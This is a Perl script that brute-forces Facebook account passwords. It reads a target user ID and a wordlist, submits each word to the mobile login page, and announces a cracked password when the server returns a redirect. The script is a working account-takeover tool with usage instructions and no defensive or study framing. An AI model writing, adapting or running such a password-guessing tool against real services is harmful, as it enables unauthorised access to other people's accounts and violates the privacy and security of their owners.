#!/usr/bin/perl

use LWP::UserAgent;

$site = $ARGV[0];
$id = $ARGV[1];
$wordl = $ARGV[2];

if(@ARGV != 3){
print "
Facebook Brute Perl Version C0ded bY Satya Enki

How to use: $0 <site> <ID> <wordlist>
Example: $0 m.facebook.com ID wordlist.txt

";
exit;
}

if ($site !~ /^http:\/\//){
$site = 'http://' . $site;
}
if ($site !~ /\/login.php/){
$site = $site . '/login.php';
}

open(a,"<$wordl") or die "$!";
print "\n\nSite: $site\nUsername: $id\n\nAttacking...\n\n";
sleep(2);
while(<a>){
chomp($_);

my $ua = new LWP::UserAgent;

my $response 
= $ua->post($site, 
{ email => $id, 
pass => $_,
login => 'login',
});

my $code = $response->code;
print "[+] Testing... $_\n";
if($code == 302){ 
print "\n\n\t[*] PASSWORD CRACKED: $_\n\n";
exit;
}
}
exit;